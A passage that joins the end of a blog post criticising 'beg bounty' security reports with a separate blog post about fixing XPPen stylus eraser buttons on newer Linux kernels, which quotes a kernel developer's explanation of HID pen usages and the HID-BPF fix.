href="https://twitter.com/search?q=troyhunt+%22anyone+got+a+security+contact%22&amp;src=typed_query&amp;f=live&amp;ref=troyhunt.com">a Twitter search for me asking for security contacts at a company</a>. It shouldn't be this way and shady approaches by bounty beggars makes it all the harder. I'm sitting on literally <em>billions</em> of records from undisclosed data breaches because the burden of disclosure is so high. </p><p>Finally, I'm a <em>massive </em>supporter of <a href="https://securitytxt.org/?ref=troyhunt.com">the security.txt standard</a> and have been for many years now, and I just hate hearing stories from people about how it's being abused for beg bounties. This is literally one of the barriers to entry: as soon as security contacts are published, organisations have to deal with garbage reports that create noise and cause genuine, <em>legitimate </em>reports to sink amongst all the crap they're dealing with.</p><p>This is why I have no patience for beg bounties and no hesitation exposing those who partake in them to the detriment of absolutely everyone other than themselves. If you receive this garbage, respond with a stern word and a link to this post... and perhaps a tweet thread of your own 🙂</p><blockquote data-conversation="none"><p lang="en" dir="ltr">From now on, I won't ignore this kind of emails.

<p>Both styluses of my XPPen Artist 24 Pro and XPPen Artist 16 Pro Gen2 styluses are now usable again on newer Linux kernels. </p>
<p>This blog-post is a follow-up post of <a href="https://www.davidrevoy.com/article995/how-a-kernel-update-broke-my-stylus-need-help">"How a kernel update broke my stylus... Need help!"</a> published 10 days ago. Please read it if you want to know more about the problem I had with the stylus.</p>
<p>After this first blog post (and thanks to your comments and guidance, especially <a href="https://chitter.xyz/@efi">efi@chitter.xyz</a>) I was able to <a href="https://lore.kernel.org/all/nycvar.YFH.7.76.2311012033290.29220@cbobk.fhfr.pm/">email my bug</a> to experts in the area.</p>
<p>Then Jiri Kosina republished my email to the <a href="https://lore.kernel.org/all/nycvar.YFH.7.76.2311012033290.29220@cbobk.fhfr.pm/">mailing-list</a>. A big thanks to them, to Illia Ostapyshyn for the discussion, and to Benjamin Tissoires for developing a solution. </p>
<p>If you have the same issue with a similar device, you'll have to compile:<br>
<a href="https://gitlab.freedesktop.org/libevdev/udev-hid-bpf/">https://gitlab.freedesktop.org/libevdev/udev-hid-bpf/</a></p>
<p>This solution is still W.I.P. and I still have some homework to send more data about my tablets after this blog post, but in overall I'm already using a newer kernel (Linux workstation 6.5.10-200.fc38.x86_64) and I don't have the problem with the eraser mode on the top button of my XPPen Artist 24 Pro and XPPen Artist 16 Pro Gen2 styluses. The buttons are also now perfectly customisable via <code>xsetwacom</code> CLI tool. Yay! That's why I wanted to share this blog-post as soon as possible.</p>
<p>On the mailing list Benjamin wrote me a detailed answer about the whole story. It's very interesting and I decided to copy and paste it here. Thanks again Benjamin! 👍</p>

<p>Hi David,</p>
<p>Here is a little bit of history of why you were encountering this bug:</p>
<p>First, HID is a quite old protocol and has the benefit of being "plug
and play" <a href="https://who-t.blogspot.com/2018/12/understanding-hid-report-descriptors.html">[0]</a> <a href="https://docs.kernel.org/hid/hidintro.html">[1]</a>.</p>
<p>But plug and play often means for a hardware maker: "let's do trial
and error until Windows seems to behave in a correct way".</p>
<p>In some other cases, Microsoft puts more restrictions on the HID part
(Windows 7 enforced touchscreens to follow a specific pattern, and
then Windows 8 did it for touchpads). And they also sometimes provide
a test suite that hardware makers have to pass to be "certified".
They have to pass the test suite by using the Windows provided generic
driver, but Windows also allows them to create a virtual HID device
and let a custom driver create that virtual HID device. Which means,
we sometimes have devices behaving badly but working perfectly fine on
Windows because there are bits missing in the device itself that are
fixed by adding an extra software layer. Sigh.</p>
<p>But I digress and we need to go back to the pen bits, and AFAIK, there
is no such test suite and certification.</p>
<p>So basically, hardware makers follow the empiric rule of "if Windows
is happy, I am too".</p>
<p>To do so, they have to use several events from HID <a href="https://usb.org/sites/default/files/hut1_4.pdf">[2]</a> (quoting them):</p>
<ul>
<li><strong>Tip Switch</strong> → A switch located at the tip of a stylus, indicating
contact of the stylus with a surface. A pen-based system or system
extension would use this switch to enable the input of handwriting or
gesture data. The system typically maps Tip Switch to a primary button
in a non-pen context.</li>
<li><strong>In Range</strong> → Indicates that a transducer is located within the
region where digitizing is possible. In Range is a bit quantity</li>
<li><strong>Barrel Switch</strong> → A non-tip button located on the barrel of a
stylus. Its function is typically mapped to a system secondary button
or to a Shift key modifier that changes the Tip Switch function from
primary button to secondary button.</li>
<li><strong>Secondary Barrel Switch</strong> → A second non-tip button located on the
barrel of a stylus further from the tip than the Barrel Switch. Its
function is typically mapped to a system secondary or tertiary button.</li>
<li><strong>Eraser</strong> → This control is used for erasing objects. Following the
metaphor of a pencil, it is typically located opposite the writing end
of a stylus. It may be a bit switch or a pressure quantity.</li>
<li><strong>Invert</strong> → A bit that indicates that the currently sensed position
originates from the end of a stylus opposite the tip.</li>
</ul>
<p>I'm sure that by reading those, everybody should be able to
immediately know how to write a Pen HID device, and how the
interactions between the events should be. :) (If you are, please
contact me ASAP, we have plenty of kernel work to do).</p>
<p>So for years the state of pen devices in the Linux kernel was 2 fold:</p>
<ul>
<li>Wacom shipped an in-kernel driver for their own devices, that they
tested and that defined the de-facto "standard" in Linux</li>
<li>the rest was trying to catch up by luck or with the help of projects
like DiGiMend, by relying on the generic HID processing of the Linux
kernel</li>
</ul>
<p>However, they were no specification for how the events should come:
basically in the hid generic input processing each event was mapped to
a single input keycode and we had situations were we would get both
<code>BTN_TOOL_PEN</code> and <code>BTN_TOOL_ERASER</code> at the same time (because the <code>In Range</code> and the <code>Eraser</code> bits were sent by the device at the same
time). Which means "hey, the user is interacting with a pen with both
the tail and the tip at the same time. Good luck with that!"</p>
<p>This led to a complex situation where userspace (libinput mostly) had
to do guesses on what is the intent of the user. But the problem is
that when you are in userspace, you don't know all of the events of
the device at the same time, so it was messy to deal with. Again,
Wacom devices were unaffected because they controlled all of the
stack: a kernel driver to fix/interpret their devices and a userspace
component, xf86-drv-wacom, in the X.org world.</p>
<p>Once, as you mentioned in your blog, Microsoft decided to use the
second barrel button as the "rubber" mode. The reason was practical:
people liked the rubber capability on the styluses, but they wanted to
have a separate button on the tail end of the styluses. And I suppose
that at the time, given that no other hardware vendors were capable of
having no-battery styluses but Wacom (IP protection and capabilities
of the hardware IIRC), you still had to put the battery somewhere. And
that tail end is convenient for storing such a battery. But that makes
it harder to have an eraser end because you need to link both ends of
the pen on the same IC, with a battery in the middle that is roughly
the same size as your pen's barrel. So having just 2 wires for the
battery allows you to have a separate bluetooth button on one end, and
the normal stylus on the other end, and keep the width of the pen
reasonable.</p>
<p>So that choice of using the second button as an eraser was made, and
the hardware makers followed: on the XP-Pen Artist Pro 24, the device
reports <code>Tip Switch</code>, <code>Barrel Switch</code>, <code>Eraser</code>, <code>In Range</code>.
Which is "correct" according to the HID Usage Table <a href="https://usb.org/sites/default/files/hut1_4.pdf">[2]</a>, but which
doesn't adhere to the recommendation Microsoft is doing <a href="https://learn.microsoft.com/en-us/windows-hardware/design/component-guidelines/windows-pen-states">[3]</a>: the
device should report an extra <code>Invert</code> when the pen is in range with
the intent to erase...</p>
<p>But you can see that XP-Pen tried to adhere to it in some ways because
if you look carefully at the events coming from the device with
hid-recorder <a href="https://gitlab.freedesktop.org/libevdev/hid-tools">[4]</a>, you'll notice that when you are in range of the
sensor and press this button, you'll get an extra "In Range = 0" event
to notify that you went out of proximity of the sensor.</p>
<p>In kernel 5.18, with commit 87562fcd1342 ("HID: input: remove the need
for HID_QUIRK_INVERT"), I tried to remove those multiple tool states
to have a straightforward state provided by the kernel that userspace
can deal with easily. However, given that there were no regression
tests at the time for generic tablets, I wrote some based on
Microsoft's recommendation <a href="https://learn.microsoft.com/en-us/windows-hardware/design/component-guidelines/windows-pen-states">[3]</a> and also tested on a Huion device I
have locally. And it was working fine. But I didn't have the devices
that were not sending <code>Invert</code>, which explained why it was bogus on
those devices.</p>
<p>This was "fixed" in kernel 6.6 with commit 276e14e6c399 ("HID: input:
Support devices sending Eraser without Invert"). Putting quotes around
"fixed" because I'm still not happy about this patch.</p>
<p>But the point is, from kernel 5.18, the Pen processing in the kernel
became a state machine, which means we can not have external actors
tampering with it.</p>
<p>Why using the ioctl EVIOCSKEYCODE is bad to remap <code>Eraser</code> to
<code>BTN_STYLUS2</code> (through tools like evmap):</p>
<p>Having the ability to do something doesn't mean it's the right thing
to do. And in that case, this is definitely wrong because you have to
call the ioctl after the kernel presents the device to userspace.
Which means userspace (and the kernel) already made assumptions on the
device itself. There is a high chance libinput (or the Wacom driver)
opens the device before evmap, and that it is considering that the
device doesn't have <code>BTN_STYLUS2</code>. So sending that event would break
userspace.</p>
<p>And in our case here, the kernel expects some state between the input
layer and its internal HID state, and remapping that HID event to
something else confuses it.</p>
<p>There is another side effect of this: usually end users configuring
their devices with such tools do not report back their configuration
to the kernel community. In some cases this is valid (this is my
preference and my choice), but in other cases it's not (there is a bug
here and I'm papering over it).</p>
<p>So, what can be done?</p>
<p>Basically 2 options:</p>
<ol>
<li>write a kernel patch to fix that problem once and for all</li>
<li>use the brand new HID-BPF<a href="https://docs.kernel.org/hid/hid-bpf.html">[5]</a> capability introduced in kernel v6.3
and send me back the BPF program so I can eventually integrate the
source in the kernel tree itself and fix that problem once and for all
as well</li>
</ol>
<p>For 1., you need:</p>
<ul>
<li>to be able to dig into the kernel code</li>
<li>to be able to write a patch with the correct kernel standard (with a
regression test in <code>tools/testing/selftests/hid</code>, please)</li>
<li>to be able to compile your own kernel and test it</li>
<li>to be able to submit your contribution by email (I can suggest using
b4 for that, very nice tool)</li>
<li>to be able to take reviews into account, and learn <code>git rebase -i</code>
to submit v2, v3, and potentially v10 or more in some complex cases</li>
<li>to wait for the patch to be integrated into Linus' tree</li>
<li>to wait for Greg to backport your patch into a stable kernel tree</li>
<li>to wait for your distribution to pick up the stable tree with your patch</li>
</ul>
<p>That's relatively easy, no? :)</p>
<p>OTOTH, we have 2.: HID-BPF <a href="https://docs.kernel.org/hid/hid-bpf.html">[5]</a></p>
<p>Very quickly, eBPF <a href="https://docs.kernel.org/bpf/index.html">[6]</a> is a state machine inside the kernel that
allows user space to include a verified code path in the kernel to
tweak its behavior. And I adapted this for HID so you can:</p>
<ul>
<li>change the report descriptor of the device: this
disconnects/reconnects the device, meaning the kernel works on the new
report descriptor and is consistent with its state</li>
<li>change the event flow of the device: to fix the spurious out-of-prox
event for example</li>
<li>more to come</li>
</ul>
<p>What is interesting in BPF (or eBPF), is that nowadays, libbpf
implements something named CORE (Compile Once Run Everywhere). Which
means that if I compile locally an eBPF program on my machine with my
development kernel, as long as I only use functions available from
kernel v6.3 for instance, the same compilation output (that changes
the event flow of your HID device) will work on any kernel from v6.3
unless there are some later API breakages[7].</p>
<p>Which means, anybody can modify the event flow of an HID device, put
the file in the filesystem, and have the device still fixed even if
they upgrade their kernel.</p>
<p>In the long run, I intend to include those HID-BPF fixes in the kernel
tree to centralize them, but also to be able to automatically load
them from the kernel when those devices appear.</p>
<p>Which means, for the reporter of such a bug you:</p>
<ul>
<li>can now rely on someone else to write the code, compile it and
provide the compilation result <a href="https://gitlab.freedesktop.org/libevdev/udev-hid-bpf/-/merge_requests/27">[10]</a></li>
<li>just put that result in the filesystem to have the device tested and fixed</li>
</ul>
<p>Behind the scenes, that other knowledgeable person can take the heavy
task of submitting the kernel patch for you, but given that the code
has been tested, it's way easier to do (and to eventually re-test).</p>
<p>Currently, the "let's integrate that bpf program in the kernel" is not
completely done, so we use udev-hid-bpf<a href="https://gitlab.freedesktop.org/libevdev/udev-hid-bpf">[8]</a><a href="https://libevdev.pages.freedesktop.org/udev-hid-bpf/tutorial.html">[9]</a> to give it a jump start.</p>
<p>And that's exactly what happened in your case David. Which is why I'm
so happy (also because I fixed the tools from an author I like and
already had the books at home :-P):</p>
<p>You want your device to be fixed now, but going through a regular
kernel patch means months before it's fixed in your distribution.
But with HID-BPF, I fixed it now, and you can safely upgrade the
kernel, because even if I do changes in the kernel, the HID-BPF fix
will still convert the device into something valid from the HID point
of view, and it has a regression test now. When your device will be
fixed in the future in the kernel, there is a high chance the <code>probe</code>
function of the HID-BPF program will say that it's not the correct
device, and so the program will not even load and rely on the fixed
kernel only. Transparently for you, without you having to change your
filesystem.</p>
<p>On my side, what's left to be done:</p>
<ul>
<li>First, I need to fix the tablets not sending the <code>Invert</code> usage.
Commit 276e14e6c399 ("HID: input: Support devices sending Eraser
without Invert") is IMO not good enough, and we might as well simply
say that if there is no <code>Invert</code> usage, we can convert the <code>Eraser</code>
usage into <code>Secondary Barrel Switch</code></li>
<li>then I need to fix the XP-Pen Artist Pro 16 gen 2 from the kernel
too, by replacing the <code>Eraser</code> usage with <code>Secondary Barrel Switch</code>.
Ideally I would just dump the HID-BPF program in the kernel, but this
is not available yet, so I'll probably write a small kernel driver
using the same code path as the HID-BPF program.</li>
<li>then Peter and I need to write a more generic HID-BPF program to
convert "eraser mode buttons" into <code>Secondary Barrel Switch</code>,
basically unwinding what the hardware does. This can only happen when
libinput will be able to do the opposite transformation so we don't
regress. But we can rely on libwacom to tell us if this pen has a tail
end eraser or not, and then have userspace choose if they want the
button to be a button, or an eraser mode.</li>
</ul>
<p>I think that's pretty much it.</p>
<p>Thanks for reading through everything :)</p>

Benjamin</p>
